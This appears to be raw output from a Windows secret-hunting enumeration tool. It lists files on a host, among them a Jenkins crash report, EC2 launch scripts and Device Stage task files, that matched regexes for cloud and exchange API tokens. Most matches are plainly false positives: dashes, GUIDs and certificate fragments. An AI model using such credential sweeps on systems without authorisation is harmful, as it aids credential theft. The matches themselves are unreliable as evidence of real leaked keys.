C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: DATABASE

����������͹ Found APIs-Base64 Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1: aHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEkGCCsGAQUFBzAChj1o                                                                                                                 
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1: aHR0cHM6Ly93d3cuZGlnaWNl

����������͹ Found APIs-Artifactory API Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1: AKCBmDAaBgkqhkiG9w0BCQMxDQYLKoZIhvcN

����������͹ Found APIs-Yandex AWS Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1: YCrEEsWEmALaSKMTs3G1bJlWSHgfCwSjXAOj4rK4                                                                                                                             

����������͹ Found APIs-Coinbase Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------------------------                                                                                                                 
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------------------------                                                                                                                 

����������͹ Found APIs-Gitter Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------

����������͹ Found APIs-Kraken Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------------------------------------------------------                                                                                       
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------------------------------------------------------                                                                                       

����������͹ Found APIs-Launchdarkly Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------

����������͹ Found APIs-Netlify Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ----------------------------------------------

����������͹ Found APIs-Okta Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: ------------------------------------------

����������͹ Found APIs-RapidAPI Access Token Regexes
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Write-Log.ps1: --------------------------------------------------

����������͹ Found APIs-Kucoin Secret Key Regexes
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385cd04                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 6bdd1fc6-810f-11d0-bec7-08002be2092f                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d2fce                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03b1b9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba48e8                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0a62b                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385cd04                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 633bd6e8-0f50-4e28-b330-cc22fa995702                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d2fce                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03b1b9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba48e8                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0a62b                                                                                                                       

����������͹ Found APIs-MojoAuth API Key Regexes
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf8722c9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385cd04                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 6bdd1fc6-810f-11d0-bec7-08002be2092f                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d2fce                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03b1b9                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef4822                                                                                                                       
